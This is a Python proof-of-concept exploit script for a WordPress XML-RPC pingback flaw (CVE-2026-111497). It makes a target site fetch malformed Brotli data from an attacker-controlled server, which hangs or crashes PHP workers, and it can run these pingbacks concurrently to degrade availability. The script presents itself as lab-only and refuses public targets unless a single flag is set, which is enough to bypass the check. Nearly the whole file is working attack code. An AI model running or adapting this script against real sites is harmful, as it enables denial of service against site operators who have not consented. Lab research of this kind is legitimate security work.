#!/usr/bin/env python3
"""WordPress XML-RPC pingback PoC for CVE-2026-111497 (lab use only).

The script sends a standard pingback.ping call to a WordPress site.  The
`sourceURI` points at a server you control that returns a Brotli-encoded
body.  WordPress fetches that URL with its HTTP API, libcurl decodes
`Content-Encoding: br` in the PHP worker, and the malformed stream does the
rest.

Modes
-----
probe   Check that xmlrpc.php exists and exposes pingback.ping.
hang    Send the 86-byte non-progressing stream.  The PHP worker spins at
        100% CPU.  The stock php-fpm config has no request_terminate_timeout;
        PHP's FPM max_execution_time (30s) is the fallback and ends the
        request with exit code 124.  With an explicit request_terminate_timeout
        the worker is killed earlier with SIGTERM.
crash   Send the ~23 MB stream.  The decoder performs an out-of-bounds write
        and the PHP worker dies with SIGSEGV.

Safety
------
Targets that resolve to a public IP are refused unless
``--i-own-this-target`` is supplied.  The default is a local Docker lab.
This tool does not implement remote code execution; it only demonstrates
availability impact.

Examples
--------
    python3 poc/pingback_poc.py --target http://localhost:8080 --mode probe
    python3 poc/pingback_poc.py --target http://localhost:8080 \
        --mode hang --payload-url http://attacker:8080/small.br --show-logs
    python3 poc/pingback_poc.py --target http://localhost:8080 \
        --mode crash --payload-url http://attacker:8080/payload.br --show-logs
"""

from __future__ import annotations

import argparse
import concurrent.futures
import dataclasses
import datetime
import http.client
import ipaddress
import json
import os
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from typing import Iterable
from xml.sax.saxutils import escape

USER_AGENT = "brotli-pingback-lab/1.0 (authorized lab use)"
XML_HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": USER_AGENT,
    "Accept": "text/xml",
}

PINGBACK_XML = """<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{source}</string></value></param>
    <param><value><string>{target}</string></value></param>
  </params>
</methodCall>
"""

LIST_METHODS_XML = """<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
"""


@dataclasses.dataclass
class Result:
    kind: str
    status: int | None
    body: str
    elapsed: float
    detail: str = ""

    def short(self) -> str:
        if self.kind == "response":
            return f"HTTP {self.status} in {self.elapsed:.1f}s"
        if self.kind == "http_error":
            return f"HTTP {self.status} in {self.elapsed:.1f}s"
        if self.kind == "timeout":
            return f"timeout after {self.elapsed:.1f}s"
        return f"{self.kind} after {self.elapsed:.1f}s ({self.detail})"


def decode_body(raw: bytes) -> str:
    return raw.decode("utf-8", "replace").replace("\n", " ")[:600]


def post_xml(url: str, body: str, timeout: float) -> Result:
    request = urllib.request.Request(
        url, data=body.encode("utf-8"), headers=XML_HEADERS, method="POST"
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read(8192)
            return Result(
                "response", response.status, decode_body(raw), time.monotonic() - started
            )
    except urllib.error.HTTPError as error:
        raw = error.read(8192)
        return Result(
            "http_error", error.code, decode_body(raw), time.monotonic() - started
        )
    except urllib.error.URLError as error:
        elapsed = time.monotonic() - started
        if isinstance(error.reason, (socket.timeout, TimeoutError)):
            return Result("timeout", None, "", elapsed, "socket timeout")
        return Result("connection_error", None, "", elapsed, str(error.reason))
    except (socket.timeout, TimeoutError):
        return Result("timeout", None, "", time.monotonic() - started, "socket timeout")
    except (ConnectionError, http.client.HTTPException, OSError) as error:
        return Result(
            "connection_error",
            None,
            "",
            time.monotonic() - started,
            type(error).__name__,
        )


def get_text(url: str, timeout: float = 5.0) -> Result:
    request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
    started = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            raw = response.read(262144)
            return Result(
                "response", response.status, decode_body(raw), time.monotonic() - started
            )
    except urllib.error.HTTPError as error:
        return Result(
            "http_error",
            error.code,
            decode_body(error.read(8192)),
            time.monotonic() - started,
        )
    except urllib.error.URLError as error:
        elapsed = time.monotonic() - started
        if isinstance(error.reason, (socket.timeout, TimeoutError)):
            return Result("timeout", None, "", elapsed, "socket timeout")
        return Result("connection_error", None, "", elapsed, str(error.reason))
    except (socket.timeout, TimeoutError):
        return Result("timeout", None, "", time.monotonic() - started, "socket timeout")
    except (ConnectionError, http.client.HTTPException, OSError) as error:
        return Result(
            "connection_error",
            None,
            "",
            time.monotonic() - started,
            type(error).__name__,
        )


def target_is_local(host: str) -> bool:
    try:
        infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)
    except socket.gaierror:
        return False
    addresses = {info[4][0] for info in infos}
    if not addresses:
        return False
    for raw in addresses:
        try:
            address = ipaddress.ip_address(raw.split("%", 1)[0])
        except ValueError:
            return False
        if not (address.is_private or address.is_loopback or address.is_link_local):
            return False
    return True


def safety_check(target: str, authorized: bool) -> None:
    parsed = urllib.parse.urlparse(target)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise SystemExit(f"[-] invalid target URL: {target}")
    if parsed.hostname in ("localhost", "127.0.0.1", "::1"):
        return
    if target_is_local(parsed.hostname):
        return
    if not authorized:
        raise SystemExit(
            "[-] refusing a public target.\n"
            "    This tool is for the Docker lab or systems you own.\n"
            "    Re-run with --i-own-this-target only after written authorization."
        )


def probe(target: str) -> int:
    print(f"[*] target      : {target}")

    home = get_text(target.rstrip("/") + "/", timeout=5)
    print(f"[*] GET /       : {home.short()}")
    if home.kind == "response":
        body = home.body
        start = body.lower().find("<title>")
        end = body.lower().find("</title>", start + 1)
        if start >= 0 and end > start:
            print(f"[*] title       : {body[start + 7:end].strip()[:120]}")

    methods = post_xml(
        target.rstrip("/") + "/xmlrpc.php", LIST_METHODS_XML, timeout=8
    )
    print(f"[*] xmlrpc.php  : {methods.short()}")
    if methods.kind in ("response", "http_error") and "pingback.ping" in methods.body:
        print("[+] pingback.ping is exposed")
        return 0
    if methods.kind in ("response", "http_error") and "XML-RPC server accepts POST" in methods.body:
        print("[-] xmlrpc.php is present but pingback.ping was not listed")
        return 1
    print("[-] could not confirm pingback.ping (XML-RPC may be disabled)")
    print(f"    response: {methods.body[:200]}")
    return 1


def check_payload_server(payload_url: str) -> None:
    parsed = urllib.parse.urlparse(payload_url)
    health_url = urllib.parse.urlunparse(parsed._replace(path="/health", query="", fragment=""))
    result = get_text(health_url, timeout=5)
    if result.kind == "response":
        print(f"[*] payload srv : {result.body[:200]}")
    else:
        print(f"[!] payload srv : {result.short()} (the target must still be able to reach it)")


def one_pingback(
    index: int,
    target: str,
    post_url: str,
    payload_url: str,
    timeout: float,
) -> tuple[int, Result, str]:
    separator = "&" if "?" in payload_url else "?"
    source = f"{payload_url}{separator}cb={uuid.uuid4().hex}"
    body = PINGBACK_XML.format(source=escape(source), target=escape(post_url))
    endpoint = target.rstrip("/") + "/xmlrpc.php"
    print(f"[{index}] -> sourceURI={source}", flush=True)
    result = post_xml(endpoint, body, timeout=timeout)
    print(f"[{index}] <- {result.short()}", flush=True)
    return index, result, source


def classify(mode: str, result: Result) -> str:
    if mode == "hang":
        if result.kind == "timeout":
            return "hung"
        if result.kind == "http_error" and result.status in (500, 502, 503, 504):
            if result.elapsed >= 4.0:
                return "worker-killed"
            return "upstream-error"
        if result.kind == "connection_error" and result.elapsed >= 4.0:
            return "worker-killed"
        if result.kind == "response" and "fault" in result.body.lower():
            return "fault-no-hang"
        return "unexpected"

    if mode == "crash":
        if result.kind == "connection_error":
            return "crashed"
        if result.kind == "http_error" and result.status in (502, 504):
            return "crashed"
        if result.kind == "timeout":
            return "inconclusive-timeout"
        if result.kind == "response" and "fault" in result.body.lower():
            return "fault-no-crash"
        return "unexpected"

    return "unexpected"


def show_logs(project: str, since: str | None = None) -> None:
    print("\n[*] recent php-fpm / WordPress log lines")
    command = [
        "docker",
        "compose",
        "-p",
        project,
        "logs",
        "--no-color",
        "--tail=200",
    ]
    if since:
        command.append(f"--since={since}")
    command.append("wordpress")
    try:
        completed = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=20,
            check=False,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired) as error:
        print(f"[!] could not read docker logs: {error}")
        return

    needles = (
        "SIGSEGV",
        "signal 11",
        "SIGKILL",
        "signal 9",
        "SIGTERM",
        "signal 15",
        "execution timed out",
        "exited on signal",
        "child ",
        "WARNING",
    )
    lines = [
        line
        for line in (completed.stdout + completed.stderr).splitlines()
        if any(needle in line for needle in needles)
    ]
    if not lines:
        print("    (no matching lines; the worker may not have been killed yet)")
        return
    for line in lines[-40:]:
        print(f"    {line}")


def summarize(mode: str, verdicts: Iterable[str]) -> bool:
    counts: dict[str, int] = {}
    for verdict in verdicts:
        counts[verdict] = counts.get(verdict, 0) + 1

    print("\n[*] summary")
    for verdict, count in sorted(counts.items()):
        print(f"    {verdict:24s} {count}")

    if mode == "hang":
        good = counts.get("hung", 0) + counts.get("worker-killed", 0)
        print(
            f"[{'!' if good else '-'}] {good} request(s) hung or forced a worker kill"
        )
        return good > 0

    good = counts.get("crashed", 0)
    inconclusive = counts.get("inconclusive-timeout", 0)
    print(f"[{'!' if good else '-'}] {good} request(s) look like worker crashes")
    if inconclusive:
        print(
            f"[!] {inconclusive} request(s) timed out; the 23 MB transfer may be "
            "slower than the client timeout (try the local attacker URL)."
        )
    return good > 0


def main() -> int:
    parser = argparse.ArgumentParser(
        description="CVE-2026-111497 WordPress pingback lab PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--target", required=True, help="WordPress base URL, e.g. http://localhost:8080")
    parser.add_argument("--post-url", help="pingback target post (default: TARGET/?p=1)")
    parser.add_argument("--payload-url", help="public URL of the payload server")
    parser.add_argument("--mode", choices=("probe", "hang", "crash"), default="probe")
    parser.add_argument("--workers", type=int, default=4, help="concurrent pingbacks (default 4)")
    parser.add_argument("--count", type=int, help="total pingbacks (default: workers)")
    parser.add_argument("--timeout", type=float, default=25.0, help="per-request timeout (default 25s)")
    parser.add_argument("--check-payload", action="store_true", help="GET /health on the payload server")
    parser.add_argument("--show-logs", action="store_true", help="read recent Docker logs after the attack")
    parser.add_argument("--docker-project", default=os.environ.get("COMPOSE_PROJECT_NAME", "brotli-pingback-lab"))
    parser.add_argument("--recovery-wait", type=float, default=6.0, help="seconds to wait before the final probe")
    parser.add_argument(
        "--i-own-this-target",
        action="store_true",
        help="allow a target that resolves to a public IP (authorization required)",
    )
    parser.add_argument("--json", action="store_true", help="emit a JSON summary")
    args = parser.parse_args()

    safety_check(args.target, args.i_own_this_target)
    post_url = args.post_url or args.target.rstrip("/") + "/?p=1"

    if args.mode in ("hang", "crash") and not args.payload_url:
        parser.error("--payload-url is required for hang/crash modes")

    if args.mode == "probe":
        return probe(args.target)

    if args.payload_url and args.check_payload:
        check_payload_server(args.payload_url)

    count = args.count or args.workers
    count = max(1, min(count, 32))
    workers = max(1, min(args.workers, count))

    print(f"[*] target      : {args.target}")
    print(f"[*] post        : {post_url}")
    print(f"[*] payload     : {args.payload_url}")
    print(f"[*] mode        : {args.mode}")
    print(f"[*] concurrency : {workers} ({count} total)")
    print()

    before = get_text(args.target.rstrip("/") + "/", timeout=5)
    print(f"[*] site before : {before.short()}")

    attack_since = (
        datetime.datetime.now(datetime.timezone.utc)
        .replace(microsecond=0)
        .isoformat()
        .replace("+00:00", "Z")
    )
    started = time.monotonic()
    results: list[tuple[int, Result, str]] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [
            pool.submit(
                one_pingback,
                index,
                args.target,
                post_url,
                args.payload_url,
                args.timeout,
            )
            for index in range(1, count + 1)
        ]
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())
    elapsed = time.monotonic() - started

    verdicts = [classify(args.mode, result) for _, result, _ in results]
    success = summarize(args.mode, verdicts)

    after = get_text(args.target.rstrip("/") + "/", timeout=5)
    print(f"[*] site after  : {after.short()} (attack took {elapsed:.1f}s)")

    if args.mode == "hang":
        if after.kind in ("timeout", "connection_error"):
            print(f"[*] waiting {args.recovery_wait:.0f}s for php-fpm to reap stuck workers ...")
            time.sleep(args.recovery_wait)
            recovered = get_text(args.target.rstrip("/") + "/", timeout=8)
            print(f"[*] site after wait: {recovered.short()}")
        print("[*] note: the stock php-fpm config has no request_terminate_timeout;")
        print("    PHP-FPM max_execution_time (30s) is the fallback. Use")
        print("    `make restart` to recover immediately.")

    if args.show_logs:
        show_logs(args.docker_project, attack_since)

    if args.json:
        print(
            json.dumps(
                {
                    "mode": args.mode,
                    "target": args.target,
                    "payload_url": args.payload_url,
                    "success": success,
                    "elapsed": elapsed,
                    "results": [
                        {"index": index, "verdict": verdict, **dataclasses.asdict(result)}
                        for (index, result, _), verdict in zip(results, verdicts)
                    ],
                },
                indent=2,
            )
        )

    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
